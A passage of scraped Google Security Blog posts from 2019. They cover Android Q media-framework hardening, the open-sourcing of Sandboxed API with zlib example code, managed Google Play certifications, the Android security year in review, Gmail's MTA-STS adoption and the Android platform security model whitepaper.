receive a lower severity based on Android’s severity guidelines.   The following figure shows an overview of the evolution of media services layout in the recent Android releases.     Prior to N, media services are all inside one monolithic mediaserver process, and the extractors run inside the client.   In N, we delivered a major security re-architect, where a number of lower-level media services are spun off into individual service processes with reduced privilege sandboxes. Extractors are moved into server side, and put into a constrained sandbox. Only a couple of higher-level functionalities remained in mediaserver itself.  In O, the services are “treblized,” and further deprivileged that is, separated into individual sandboxes and converted into HALs. The media.codec service became a HAL while still hosting both software and hardware codec implementations.   In Q, the software codecs are extracted from the media.codec process, and moved back to system side. It becomes a system service that exposes the codec HAL interface. Selinux policy and seccomp filters are further tightened up for this process. In particular, while the previous mediacodec process had access to device drivers for hardware accelerated codecs, the software codec process has no access to device drivers.      With this move, we now have the two primary sources for media vulnerabilities tightly sandboxed within constrained processes. Software codecs are similar to extractors in that they both have extensive code parsing bitstreams from untrusted sources. Once a vulnerability is identified in the source code, it can be triggered by sending a crafted media file to media APIs (such as MediaExtractor or MediaCodec). Sandboxing these two services allows us to reduce the severity of potential security vulnerabilities without compromising performance.   In addition to constraining riskier codecs, a lot of work has also gone into preventing common types of vulnerabilities.  Bound Sanitizer    Incorrect or missing memory bounds checking on arrays account for about 34% of Android’s userspace vulnerabilities. In cases where the array size is known at compile time, LLVM’s bound sanitizer (BoundSan) can automatically instrument arrays to prevent overflows and fail safely.    BoundSan instrumentation  BoundSan is enabled in 11 media codecs and throughout the Bluetooth stack for Android Q. By optimizing away a number of unnecessary checks the performance overhead was reduced to less than 1%. BoundSan has already found/prevented potential vulnerabilities in codecs and Bluetooth.  More integer sanitizer in more places    Android pioneered the production use of sanitizers in Android Nougat when we first started rolling out integer sanization (IntSan) in the media frameworks. This work has continued with each release and has been very successful in preventing otherwise exploitable vulnerabilities. For example, new IntSan coverage in Android Pie mitigated 11 critical vulnerabilities. Enabling IntSan is challenging because overflows are generally benign and unsigned integer overflows are well defined and sometimes intentional. This is quite different from the bound sanitizer where OOB reads/writes are always unintended and often exploitable. Enabling Intsan has been a multi year project, but with Q we have fully enabled it across the media frameworks with the inclusion of 11 more codecs.     IntSan Instrumentation  IntSan works by instrumenting arithmetic operations to abort when an overflow occurs. This instrumentation can have an impact on performance, so evaluating the impact on CPU usage is necessary. In cases where performance impact was too high, we identified hot functions and individually disabled IntSan on those functions after manually reviewing them for integer safety.   BoundSan and IntSan are considered strong mitigations because (where applied) they prevent the root cause of memory safety vulnerabilities. The class of mitigations described next target common exploitation techniques. These mitigations are considered to be probabilistic because they make exploitation more difficult by limiting how a vulnerability may be used.   Shadow Call Stack    LLVM’s Control Flow Integrity (CFI) was enabled in the media frameworks, Bluetooth, and NFC in Android Pie. CFI makes code reuse attacks more difficult by protecting the forward-edges of the call graph, such as function pointers and virtual functions. Android Q uses LLVM’s Shadow Call Stack (SCS) to protect return addresses, protecting the backwards-edge of control flow graph. SCS accomplishes this by storing return addresses in a separate shadow stack which is protected from leakage by storing its location in the x18 register, which is now reserved by the compiler.     SCS Instrumentation  SCS has negligible performance overhead and a small memory increase due to the separate stack. In Android Q, SCS has been turned on in portions of the Bluetooth stack and is also available for the kernel. We’ll share more on that in an upcoming post.  eXecute-Only Memory    Like SCS, eXecute-Only Memory (XOM) aims at making common exploitation techniques more expensive. It does so by strengthening the protections already provided by address space layout randomization (ASLR) which in turn makes code reuse attacks more difficult by requiring attackers to first leak the location of the code they intend to reuse. This often means that an attacker now needs two vulnerabilities, a read primitive and a write primitive, where previously just a write primitive was necessary in order to achieve their goals. XOM protects against leaks (memory disclosures of code segments) by making code unreadable. Attempts to read execute-only code results in the process aborting safely.     Tombstone from a XOM abort  Starting in Android Q, platform-provided AArch64 code segments in binaries and libraries are loaded as execute-only. Not all devices will immediately receive the benefit as this enforcement has hardware dependencies (ARMv8.2+) and kernel dependencies (Linux 4.9+, CONFIG_ARM64_UAO). For apps with a targetSdkVersion lower than Q, Android’s zygote process will relax the protection in order to avoid potential app breakage, but 64 bit system processes (for example, mediaextractor, init, vold, etc.) are protected. XOM protections are applied at compile-time and have no memory or CPU overhead.  Scudo Hardened Allocator    Scudo is a dynamic heap allocator designed to be resilient against heap related vulnerabilities such as:    Use-after-frees: by quarantining freed blocks.  Double-frees: by tracking chunk states.  Buffer overflows: by check summing headers.  Heap sprays and layout manipulation: by improved randomization.   Scudo does not prevent exploitation but rather proactively manages memory in a way to make exploitation more difficult. It is configurable on a per-process basis depending on performance requirements. Scudo is enabled in extractors and codecs in the media frameworks.    Tombstone from Scudo aborts Contributing security improvements to Open Source    AOSP makes use of a number of Open Source Projects to build and secure Android. Google is actively contributing back to these projects in a number of security critical areas:    Creator and primary contributor to AddressSanitizer and other \"sanitizer\" (compiler-based dynamic testing tools) to LLVM.  Primary contributor to compiler-based hardening tools in LLVM (ControlFlowIntegrity, ShadowCallStack).  Creator of fuzzing tools (AFL, libFuzzer, honggfuzz, syzkaller) and fuzzing infrastructure (oss-fuzz, syzbot) for user-space and OS kernels.  Participant in research related to hardware-assisted memory safety.  Primary contributor of the Scudo hardened allocator to LLVM.   Thank you to Ivan Lozano, Kevin Deus, Kostya Kortchinsky, Kostya Serebryany, and Mike Antares for their contributions to this post.        ", "date": "May 9, 2019"},
{"website": "Google-Security", "title": "\nOpen-sourcing Sandboxed API\n", "author": ["Posted by Christian Blichmann & Robert Swiecki, ISE Sandboxing team"], "link": "https://security.googleblog.com/2019/03/open-sourcing-sandboxed-api.html", "abstract": "                             Posted by Christian Blichmann &amp; Robert Swiecki, ISE Sandboxing team     Many software projects process data which is externally generated, and thus potentially untrusted. For example, this could be the conversion of user-provided picture files into different formats, or even executing user-generated software code.         When a software library parsing such data is sufficiently complex, it might fall victim to certain types of security vulnerabilities:  memory corruption bugs  or certain other types of problems related to the parsing logic (e.g.  path traversal  issues). Those vulnerabilities can have serious security implications.    In order to mitigate those problems, developers frequently employ software isolation methods, a process commonly referred to as  sandboxing . By using sandboxing methods, developers make sure that only resources (files, networking connections and other operating system resources) which are deemed necessary are accessible to the code involved in parsing user-generated content. In the worst-case scenario, when potential attackers gain  remote code execution  rights within the scope of a software project, a sandboxing technique can contain them, protecting the rest of the software infrastructure.    Sandboxing techniques must be highly resistant to attacks and sufficiently protect the rest of the operating system, yet must be sufficiently easy-to-use for software developers. Many popular software containment tools might not sufficiently isolate the rest of the OS, and those which do, might require time-consuming redefinition of security boundaries for each and every project that should be sandboxed.     Sandbox once, use anywhere     To help with this task, we are open-sourcing our battle-tested project called  Sandboxed API . Sandboxed API makes it possible to create security policies for individual software libraries. This concept allows to create reusable and secure implementations of functionality residing within popular software libraries, yet is granular enough to protect the rest of used software infrastructure.    As Sandboxed API serves the purpose of accessing individual software functions inside a sandboxed library, we are also making publicly available our core sandboxing project,  Sandbox2 . This is now part of Sandboxed API and provides the underlying sandboxing primitives. It can be also used standalone to isolate arbitrary Linux processes, but is considered a lower-level API.     Overview       Sandboxed API is currently implemented for software libraries written in the C programming language (or providing C bindings), though we might add support for more programming runtimes in the future.    From a high-level perspective, Sandboxed API separates the library to be sandboxed and its callers into two separate OS processes: the host binary and the sandboxee. Actual library calls are then marshalled by an API object on the host side and send via interprocess communication to the sandboxee where an RPC stub unmarshals and forwards calls to the original library.    Both the API object (SAPI object) and the RPC stub are provided by the project, with the former being auto-generated by an interface generator. Users just need to provide a sandbox policy, a set of system calls that the underlying library is allowed to make, as well as the resources it is allowed to access and use. Once ready, a library based on sandboxed API can easily be reused in other projects.                 The resulting API of the SAPI object is similar to the one of the original library. For example, when using zlib, the popular compression library, a code snippet like this compresses a chunk of data (error handling omitted for brevity):             void Compress(const std::string&amp; chunk, std::string* out) {       &nbsp;z_stream zst{};       &nbsp;constexpr char kZlibVersion[] = \"1.2.11\";       &nbsp;CHECK(deflateInit_(&amp;zst, /*level=*/4, kZlibVersion, sizeof(zst)) == Z_OK);            &nbsp;zst.avail_in = chunk.size();       &nbsp;zst.next_in = reinterpret_cast&lt;uint8_t*&gt;(&amp;chunk[0]);       &nbsp;zst.avail_out = out-&gt;size();       &nbsp;zst.next_out = reinterpret_cast&lt;uint8_t*&gt;(&amp;(*out)[0]);       &nbsp;CHECK(deflate(&amp;zst, Z_FINISH) != Z_STREAM_ERROR);       &nbsp;out-&gt;resize(zst.avail_out);            &nbsp;deflateEnd(&amp;zst);      }            Using Sandboxed API, this becomes:      void CompressSapi(const std::string&amp; chunk, std::string* out) {       &nbsp;sapi::Sandbox sandbox(sapi::zlib::zlib_sapi_embed_create());       &nbsp;CHECK(sandbox.Init().ok());       &nbsp;sapi::zlib::ZlibApi api(&amp;sandbox);            &nbsp;sapi::v::Array&lt;uint8_t&gt; s_chunk(&amp;chunk[0], chunk.size());       &nbsp;sapi::v::Array&lt;uint8_t&gt; s_out(&amp;(*out)[0], out-&gt;size());       &nbsp;CHECK(sandbox.Allocate(&amp;s_chunk).ok() &amp;&amp; sandbox.Allocate(&amp;s_out).ok());       &nbsp;sapi::v::Struct&lt;sapi::zlib::z_stream&gt; s_zst;       &nbsp;       &nbsp;constexpr char kZlibVersion[] = \"1.2.11\";       &nbsp;sapi::v::Array&lt;char&gt; s_version(kZlibVersion, ABSL_ARRAYSIZE(kZlibVersion));       &nbsp;CHECK(api.deflateInit_(s_zst.PtrBoth(), /*level=*/4, s_version.PtrBefore(),       &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sizeof(sapi::zlib::z_stream).ValueOrDie() == Z_OK));            &nbsp;CHECK(sandbox.TransferToSandboxee(&amp;s_chunk).ok());       &nbsp;s_zst.mutable_data()-&gt;avail_in = chunk.size();       &nbsp;s_zst.mutable_data()-&gt;next_in = reinterpet_cast&lt;uint8_t*&gt;(s_chunk.GetRemote());       &nbsp;s_zst.mutable_data()-&gt;avail_out = out-&gt;size();       &nbsp;s_zst.mutable_data()-&gt;next_out = reinterpret_cast&lt;uint8_t*&gt;(s_out.GetRemote());       &nbsp;CHECK(api.deflate(s_zst.PtrBoth(), Z_FINISH).ValueOrDie() != Z_STREAM_ERROR);       &nbsp;CHECK(sandbox.TransferFromSandboxee(&amp;s_out).ok());       &nbsp;out-&gt;resize(s_zst.data().avail_out);            &nbsp;CHECK(api.deflateEnd(s_zst.PtrBoth()).ok());      }   As you can see, when using Sandboxed API there is extra code for setting up the sandbox itself and for transferring memory to and from the sandboxee, but other than that, the code flow stays the same.     Try for yourself       It only takes a few moments to get up and running with Sandboxed API. If  Bazel  is installed:     sudo apt-get install python-typing python-clang-7 libclang-7-dev linux-libc-dev      git clone github.com/google/sandboxed-api &amp;&amp; cd sandboxed-api      bazel test //sandboxed_api/examples/stringop:main_stringop   This will download the necessary dependencies and run the project through its paces. More detailed instructions can be found in our  Getting Started  guide and be sure to check out the  examples for Sandboxed API .     Where do we go from here?     Sandboxed API and Sandbox2 are used by many teams at Google. While the project is mature, we do have plans for the future beyond just maintaining it:       Support more operating systems - So far, only Linux is supported. We will look into bringing Sandboxed API to the Unix-like systems like the BSDs (FreeBSD, OpenBSD) and macOS. A Windows port is a bigger undertaking and will require some more groundwork to be done.   New sandboxing technologies - With things like hardware-virtualization becoming almost ubiquitous, confining code into VMs for sandboxing opens up new possibilities.   Build system - Right now, we are using Bazel to build everything, including dependencies. We acknowledge that this is not how everyone will want to use it, so CMake support is high on our priority list.   Spread the word - Use Sandboxed API to secure open source projects. If you want to get involved, this work is also eligible for the  Patch Reward Program .       Get involved            We are constantly looking at improving Sandboxed API and Sandbox2 as well as adding more features: supporting more programming runtimes, different operating systems or alternative containment technologies.         Check out the  Sandboxed API GitHub repository . We will be happy to consider your contributions and look forward to any suggestions to help improve and extend this code.                                     Posted by Christian Blichmann & Robert Swiecki, ISE Sandboxing team  Many software projects process data which is externally generated, and thus potentially untrusted. For example, this could be the conversion of user-provided picture files into different formats, or even executing user-generated software code.   When a software library parsing such data is sufficiently complex, it might fall victim to certain types of security vulnerabilities: memory corruption bugs or certain other types of problems related to the parsing logic (e.g. path traversal issues). Those vulnerabilities can have serious security implications.  In order to mitigate those problems, developers frequently employ software isolation methods, a process commonly referred to as sandboxing. By using sandboxing methods, developers make sure that only resources (files, networking connections and other operating system resources) which are deemed necessary are accessible to the code involved in parsing user-generated content. In the worst-case scenario, when potential attackers gain remote code execution rights within the scope of a software project, a sandboxing technique can contain them, protecting the rest of the software infrastructure.  Sandboxing techniques must be highly resistant to attacks and sufficiently protect the rest of the operating system, yet must be sufficiently easy-to-use for software developers. Many popular software containment tools might not sufficiently isolate the rest of the OS, and those which do, might require time-consuming redefinition of security boundaries for each and every project that should be sandboxed.  Sandbox once, use anywhere  To help with this task, we are open-sourcing our battle-tested project called Sandboxed API. Sandboxed API makes it possible to create security policies for individual software libraries. This concept allows to create reusable and secure implementations of functionality residing within popular software libraries, yet is granular enough to protect the rest of used software infrastructure.  As Sandboxed API serves the purpose of accessing individual software functions inside a sandboxed library, we are also making publicly available our core sandboxing project, Sandbox2. This is now part of Sandboxed API and provides the underlying sandboxing primitives. It can be also used standalone to isolate arbitrary Linux processes, but is considered a lower-level API.  Overview  Sandboxed API is currently implemented for software libraries written in the C programming language (or providing C bindings), though we might add support for more programming runtimes in the future.  From a high-level perspective, Sandboxed API separates the library to be sandboxed and its callers into two separate OS processes: the host binary and the sandboxee. Actual library calls are then marshalled by an API object on the host side and send via interprocess communication to the sandboxee where an RPC stub unmarshals and forwards calls to the original library.  Both the API object (SAPI object) and the RPC stub are provided by the project, with the former being auto-generated by an interface generator. Users just need to provide a sandbox policy, a set of system calls that the underlying library is allowed to make, as well as the resources it is allowed to access and use. Once ready, a library based on sandboxed API can easily be reused in other projects.    The resulting API of the SAPI object is similar to the one of the original library. For example, when using zlib, the popular compression library, a code snippet like this compresses a chunk of data (error handling omitted for brevity):    void Compress(const std::string& chunk, std::string* out) {    z_stream zst{};    constexpr char kZlibVersion[] = \"1.2.11\";    CHECK(deflateInit_(&zst, /*level=*/4, kZlibVersion, sizeof(zst)) == Z_OK);      zst.avail_in = chunk.size();    zst.next_in = reinterpret_cast (&chunk[0]);    zst.avail_out = out->size();    zst.next_out = reinterpret_cast (&(*out)[0]);    CHECK(deflate(&zst, Z_FINISH) != Z_STREAM_ERROR);    out->resize(zst.avail_out);      deflateEnd(&zst);  }    Using Sandboxed API, this becomes:  void CompressSapi(const std::string& chunk, std::string* out) {    sapi::Sandbox sandbox(sapi::zlib::zlib_sapi_embed_create());    CHECK(sandbox.Init().ok());    sapi::zlib::ZlibApi api(&sandbox);      sapi::v::Array  s_chunk(&chunk[0], chunk.size());    sapi::v::Array  s_out(&(*out)[0], out->size());    CHECK(sandbox.Allocate(&s_chunk).ok() && sandbox.Allocate(&s_out).ok());    sapi::v::Struct  s_zst;        constexpr char kZlibVersion[] = \"1.2.11\";    sapi::v::Array  s_version(kZlibVersion, ABSL_ARRAYSIZE(kZlibVersion));    CHECK(api.deflateInit_(s_zst.PtrBoth(), /*level=*/4, s_version.PtrBefore(),                            sizeof(sapi::zlib::z_stream).ValueOrDie() == Z_OK));      CHECK(sandbox.TransferToSandboxee(&s_chunk).ok());    s_zst.mutable_data()->avail_in = chunk.size();    s_zst.mutable_data()->next_in = reinterpet_cast (s_chunk.GetRemote());    s_zst.mutable_data()->avail_out = out->size();    s_zst.mutable_data()->next_out = reinterpret_cast (s_out.GetRemote());    CHECK(api.deflate(s_zst.PtrBoth(), Z_FINISH).ValueOrDie() != Z_STREAM_ERROR);    CHECK(sandbox.TransferFromSandboxee(&s_out).ok());    out->resize(s_zst.data().avail_out);      CHECK(api.deflateEnd(s_zst.PtrBoth()).ok());  } As you can see, when using Sandboxed API there is extra code for setting up the sandbox itself and for transferring memory to and from the sandboxee, but other than that, the code flow stays the same.  Try for yourself  It only takes a few moments to get up and running with Sandboxed API. If Bazel is installed:  sudo apt-get install python-typing python-clang-7 libclang-7-dev linux-libc-dev  git clone github.com/google/sandboxed-api && cd sandboxed-api  bazel test //sandboxed_api/examples/stringop:main_stringop This will download the necessary dependencies and run the project through its paces. More detailed instructions can be found in our Getting Started guide and be sure to check out the examples for Sandboxed API.  Where do we go from here?  Sandboxed API and Sandbox2 are used by many teams at Google. While the project is mature, we do have plans for the future beyond just maintaining it:   Support more operating systems - So far, only Linux is supported. We will look into bringing Sandboxed API to the Unix-like systems like the BSDs (FreeBSD, OpenBSD) and macOS. A Windows port is a bigger undertaking and will require some more groundwork to be done. New sandboxing technologies - With things like hardware-virtualization becoming almost ubiquitous, confining code into VMs for sandboxing opens up new possibilities. Build system - Right now, we are using Bazel to build everything, including dependencies. We acknowledge that this is not how everyone will want to use it, so CMake support is high on our priority list. Spread the word - Use Sandboxed API to secure open source projects. If you want to get involved, this work is also eligible for the Patch Reward Program.   Get involved    We are constantly looking at improving Sandboxed API and Sandbox2 as well as adding more features: supporting more programming runtimes, different operating systems or alternative containment technologies.    Check out the Sandboxed API GitHub repository. We will be happy to consider your contributions and look forward to any suggestions to help improve and extend this code.     ", "date": "March 18, 2019"},
{"website": "Google-Security", "title": "\nManaged Google Play earns key certifications for security and privacy\n", "author": [], "link": "https://security.googleblog.com/2019/03/managed-google-play-earns-key.html", "abstract": "                                  Posted by Mike Burr, Android Enterprise Platform Specialist      [Cross-posted from the  Android Enterprise Keyword Blog ]                            With managed Google Play, organizations can build a customized and secure mobile application storefront for their teams, featuring public and private applications. Organizations' employees can take advantage of the familiarity of a mobile app store to browse and download company-approved apps.   As with any enterprise-grade platform, it's critical that the  managed Google Play Store  operates with the highest standards of privacy and security. Managed Google Play has been awarded three important industry designations that are marks of meeting the strict requirements for information security management practices.    Granted by the  International Organization for Standardization , achieving ISO 27001 certification demonstrates that a company meets stringent privacy and security standards when operating an Information Security Management System (ISMS). Additionally, managed Google Play received SOC 2 and 3 reports, which are benchmarks of strict data management and privacy controls. These designations and auditing procedures are developed by the  American Institute of Certified Public Accountants  (AICPA).    Meeting a high bar of security management standards    To earn the ISO 27001 certification, auditors from Ernst and Young performed a thorough audit of managed Google Play based on established privacy principles. The entire methodology of documentation and procedures for managing other companies' data are reviewed during an audit, and must be made available for regular compliance review. Companies that use managed Google Play are assured their data is managed in compliance with this industry standard. Additionally, ISO 27001 certification is in line with GDPR compliance.    Secure data management    With SOC 2 and SOC 3 reports, the focus is on controls relevant to data security, availability, processing integrity, confidentiality and privacy, which are verified through auditing reports. In managed Google Play, the data and private applications that enter Google's systems are administered according to strict protocols, including determinations for who can view them and under what conditions. Enterprises require and receive the assurance that their information is handled with the utmost confidentiality and that the integrity of their data is preserved. For many companies, the presence of an SOC 2 and 3 report is a requirement when selecting a specific service. These reports prove that a service company has met and is abiding by best practices set forth by AICPA to ensure data security.    Our ongoing commitment to enterprise security    With managed Google Play, companies' private apps for internal use are protected with a set of verified information security management processes and policies to ensure intellectual property is secure. This framework includes managed Google Play accounts that are used by enterprise mobility management (EMM) partners to manage devices.   Our commitment is that Android will continue to be a leader in enterprise security. As your team works across devices and shares mission-critical data through applications hosted in managed Google Play, you have the assurance of a commitment to providing your enterprise the highest standards of security and privacy.                                       Posted by Mike Burr, Android Enterprise Platform Specialist  [Cross-posted from the Android Enterprise Keyword Blog]          With managed Google Play, organizations can build a customized and secure mobile application storefront for their teams, featuring public and private applications. Organizations' employees can take advantage of the familiarity of a mobile app store to browse and download company-approved apps.  As with any enterprise-grade platform, it's critical that the managed Google Play Store operates with the highest standards of privacy and security. Managed Google Play has been awarded three important industry designations that are marks of meeting the strict requirements for information security management practices.   Granted by the International Organization for Standardization, achieving ISO 27001 certification demonstrates that a company meets stringent privacy and security standards when operating an Information Security Management System (ISMS). Additionally, managed Google Play received SOC 2 and 3 reports, which are benchmarks of strict data management and privacy controls. These designations and auditing procedures are developed by the American Institute of Certified Public Accountants (AICPA).  Meeting a high bar of security management standards  To earn the ISO 27001 certification, auditors from Ernst and Young performed a thorough audit of managed Google Play based on established privacy principles. The entire methodology of documentation and procedures for managing other companies' data are reviewed during an audit, and must be made available for regular compliance review. Companies that use managed Google Play are assured their data is managed in compliance with this industry standard. Additionally, ISO 27001 certification is in line with GDPR compliance.  Secure data management  With SOC 2 and SOC 3 reports, the focus is on controls relevant to data security, availability, processing integrity, confidentiality and privacy, which are verified through auditing reports. In managed Google Play, the data and private applications that enter Google's systems are administered according to strict protocols, including determinations for who can view them and under what conditions. Enterprises require and receive the assurance that their information is handled with the utmost confidentiality and that the integrity of their data is preserved. For many companies, the presence of an SOC 2 and 3 report is a requirement when selecting a specific service. These reports prove that a service company has met and is abiding by best practices set forth by AICPA to ensure data security.  Our ongoing commitment to enterprise security  With managed Google Play, companies' private apps for internal use are protected with a set of verified information security management processes and policies to ensure intellectual property is secure. This framework includes managed Google Play accounts that are used by enterprise mobility management (EMM) partners to manage devices.  Our commitment is that Android will continue to be a leader in enterprise security. As your team works across devices and shares mission-critical data through applications hosted in managed Google Play, you have the assurance of a commitment to providing your enterprise the highest standards of security and privacy.     ", "date": "March 21, 2019"},
{"website": "Google-Security", "title": "\nAndroid Security & Privacy Year in Review 2018: Keeping two billion users, and their data, safe and sound\n", "author": ["Posted by Meghan Kelly, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2019/03/android-security-privacy-year-in-review.html", "abstract": "                             Posted by Meghan Kelly, Android Security &amp; Privacy Team     We're excited to release today the  2018 Android Security and Privacy Year in Review . This year's report highlights the advancements we made in Android throughout the year, and how we've worked to keep the overall ecosystem secure.   Our goal is to be open and transparent in everything we do. We want to make sure we keep our users, partners, enterprise customers, and developers up to date on the latest security and privacy enhancements in as close to real-time as possible. To that end, in 2018 we prioritized regularly providing updates through our blogs and our new  Transparency Reports , which give a quarterly ecosystem overview. In this year-in-review, you'll see fewer words and more links to relevant articles from the previous year. Check out our  Android Security Center  to get the latest on these advancements.    In this year's report, some of our top highlights include:      New features in Google Play Protect     Ecosystem and Potentially Harmful Application family highlights     Updates on our vulnerability rewards program     Platform security enhancements     We're also excited to have Dave Kleidermacher, Vice President of Android Security and Privacy, give you a rundown of the highlights from this report. Watch his video below to learn more.                                        Posted by Meghan Kelly, Android Security & Privacy Team   We're excited to release today the 2018 Android Security and Privacy Year in Review. This year's report highlights the advancements we made in Android throughout the year, and how we've worked to keep the overall ecosystem secure.  Our goal is to be open and transparent in everything we do. We want to make sure we keep our users, partners, enterprise customers, and developers up to date on the latest security and privacy enhancements in as close to real-time as possible. To that end, in 2018 we prioritized regularly providing updates through our blogs and our new Transparency Reports, which give a quarterly ecosystem overview. In this year-in-review, you'll see fewer words and more links to relevant articles from the previous year. Check out our Android Security Center to get the latest on these advancements.   In this year's report, some of our top highlights include:   New features in Google Play Protect   Ecosystem and Potentially Harmful Application family highlights   Updates on our vulnerability rewards program   Platform security enhancements   We're also excited to have Dave Kleidermacher, Vice President of Android Security and Privacy, give you a rundown of the highlights from this report. Watch his video below to learn more.       ", "date": "March 29, 2019"},
{"website": "Google-Security", "title": "\nGmail making email more secure with MTA-STS standard\n", "author": ["Posted by Nicolas Lidzborski, Senior Staff Software Engineer, Google Cloud and Nicolas Kardas, Senior Product Manager, Google Cloud "], "link": "https://security.googleblog.com/2019/04/gmail-making-email-more-secure-with-mta.html", "abstract": "                             Posted by Nicolas Lidzborski, Senior Staff Software Engineer, Google Cloud and&nbsp;Nicolas Kardas, Senior Product Manager, Google Cloud&nbsp;     We&#8217;re excited to announce that Gmail will become the first major email provider to follow the new  SMTP MTA Strict Transport Security (MTA-STS) RFC 8461  and  SMTP TLS Reporting RFC 8460  internet standards. Those new email security standards are the result of three years of collaboration within  IETF , with contributions from Google and other large email providers.     SMTP alone is vulnerable to man-in-the-middle attacks       Like all mail providers, Gmail uses Simple Mail Transfer Protocol (SMTP) to send and receive mail messages. SMTP alone only provides best-effort security with opportunistic encryption, and many SMTP servers do not prevent certain types of malicious attacks intercepting email traffic in transit.    SMTP is therefore vulnerable to man-in-the-middle attacks. Man-in-the-middle is an attack where communication between two servers is intercepted and possibly changed without detection. Real attacks and prevention were highlighted in our  research published in November 2015 . MTA-STS will help prevent these types of attacks.     MTA-STS uses encryption and authentication to reduce vulnerabilities       A MTA-STS policy for your domain means that you request external mail servers sending messages to your domain to verify the SMTP connection is authenticated with a valid public certificate and encrypted with TLS 1.2 or higher. This can be combined with TLS reporting, that means your domain can request daily reports from external mail servers with information about the success or failure of emails sent to your domain according to MTA-STS policy.     Gmail is starting MTA-STS adherence. We hope others will follow       Gmail the first major provider to follow the new standard, initially launching in Beta on April 10th 2019. This means Gmail will honor MTA-STS and TLS reporting policies configured when sending emails to domains that have defined these policies. We hope many other email providers will soon adopt these new standards that make email communications more secure.    Email domain administrators should set up DNS records and web server endpoint to configure MTA-STS and TLS reporting policies for incoming emails. Use our Help Center to find out  how to set up an MTA-STS policy with your DNS server . G Suite admins can use the G Suite Updates blog to see what MTA-STS means for G Suite domains.                                   Posted by Nicolas Lidzborski, Senior Staff Software Engineer, Google Cloud and Nicolas Kardas, Senior Product Manager, Google Cloud   We’re excited to announce that Gmail will become the first major email provider to follow the new SMTP MTA Strict Transport Security (MTA-STS) RFC 8461 and SMTP TLS Reporting RFC 8460 internet standards. Those new email security standards are the result of three years of collaboration within IETF, with contributions from Google and other large email providers.  SMTP alone is vulnerable to man-in-the-middle attacks  Like all mail providers, Gmail uses Simple Mail Transfer Protocol (SMTP) to send and receive mail messages. SMTP alone only provides best-effort security with opportunistic encryption, and many SMTP servers do not prevent certain types of malicious attacks intercepting email traffic in transit.  SMTP is therefore vulnerable to man-in-the-middle attacks. Man-in-the-middle is an attack where communication between two servers is intercepted and possibly changed without detection. Real attacks and prevention were highlighted in our research published in November 2015. MTA-STS will help prevent these types of attacks.  MTA-STS uses encryption and authentication to reduce vulnerabilities  A MTA-STS policy for your domain means that you request external mail servers sending messages to your domain to verify the SMTP connection is authenticated with a valid public certificate and encrypted with TLS 1.2 or higher. This can be combined with TLS reporting, that means your domain can request daily reports from external mail servers with information about the success or failure of emails sent to your domain according to MTA-STS policy.  Gmail is starting MTA-STS adherence. We hope others will follow  Gmail the first major provider to follow the new standard, initially launching in Beta on April 10th 2019. This means Gmail will honor MTA-STS and TLS reporting policies configured when sending emails to domains that have defined these policies. We hope many other email providers will soon adopt these new standards that make email communications more secure.  Email domain administrators should set up DNS records and web server endpoint to configure MTA-STS and TLS reporting policies for incoming emails. Use our Help Center to find out how to set up an MTA-STS policy with your DNS server. G Suite admins can use the G Suite Updates blog to see what MTA-STS means for G Suite domains.     ", "date": "April 10, 2019"},
{"website": "Google-Security", "title": "\nThe Android Platform Security Model\n", "author": ["Posted by Jeff Vander Stoep, Android Security & Privacy Team"], "link": "https://security.googleblog.com/2019/04/the-android-platform-security-model.html", "abstract": "                             Posted by Jeff Vander Stoep, Android Security &amp; Privacy Team                 Each Android release comes with great new security and privacy features. When it comes to implementing these new features we always look at ways to measure the impact with data that  demonstrates  the  effectiveness  of  these   improvements . But how do these features map to an overall strategy?    Last week, we released a whitepaper describing  The Android Platform Security Model . Specifically we discuss:      The security model which has implicitly informed the Android platform&#8217;s security design from the beginning, but has not been formally published or described outside of Google.     The context in which this security model must operate, including the scale of the Android ecosystem and its many form factors and use cases.     The complex threat model Android must address.     How Android&#8217;s reference implementation in the Android Open Source Project (AOSP) enacts the security model.     How Android&#8217;s security systems have evolved over time to address the threat model.     Android is fundamentally based on a multi-party consent  1   model: an action should only happen if the involved parties consent to it. Most importantly, apps are not considered to be fully authorized agents for the user. There are some intentional deviations from the security model and we discuss why these exist and the value that they provide to users. Finally, openness is a fundamental value in Android: from how we develop and publish in open source, to the open access users and developers have in finding or publishing apps, and the open communication mechanisms we provide for inter-app interactions which facilitate innovation within the app ecosystem.   We hope this paper provides useful information and background to all the academic and security researchers dedicated to further strengthening the security of the Android ecosystem. Happy reading!    Acknowledgements: This post leveraged contributions from René Mayrhofer, Chad Brubaker, and Nick Kralevich           Notes          The term &#8216;consent&#8217; here and in the paper is used to refer to various technical methods of declaring or enforcing a party&#8217;s intent, rather than the legal requirement or standard found in many privacy legal regimes around the world.&nbsp; &#8617;                                            Posted by Jeff Vander Stoep, Android Security & Privacy Team       Each Android release comes with great new security and privacy features. When it comes to implementing these new features we always look at ways to measure the impact with data that demonstrates the effectiveness of these improvements. But how do these features map to an overall strategy?   Last week, we released a whitepaper describing The Android Platform Security Model. Specifically we discuss:   The security model which has implicitly informed the Android platform’s security design from the beginning, but has not been formally published or described outside of Google.   The context in which this security model must operate, including the scale of the Android ecosystem and its many form factors and use cases.   The complex threat model Android must address.   How Android’s reference implementation in the Android Open Source Project (AOSP) enacts the security model.   How Android’s security systems have evolved over time to address the threat model.   Android is fundamentally based on a multi-party consent1 model: an action should only happen if the involved parties consent to it. Most importantly, apps are not considered to be fully authorized agents for the user. There are some intentional deviations from the security model and we discuss why these exist and the value that they provide to users. Finally, openness is a fundamental value in Android: from how we develop and publish in open source, to the open access users and developers have in finding or publishing apps, and the open communication mechanisms we provide for inter-app interactions which facilitate innovation within the app ecosystem.  We hope this paper provides useful information and background to all the academic and security researchers dedicated to further strengthening the security of the Android ecosystem. Happy reading!  Acknowledgements: This post leveraged contributions from René Mayrhofer, Chad Brubaker, and Nick Kralevich      Notes     The term ‘consent’ here and in the paper is used to refer to various technical methods of declaring or enforcing a party’s intent, rather than the legal requirement or standard found in many privacy legal regimes around the world. ↩         ", "date": "April 18, 2019"},
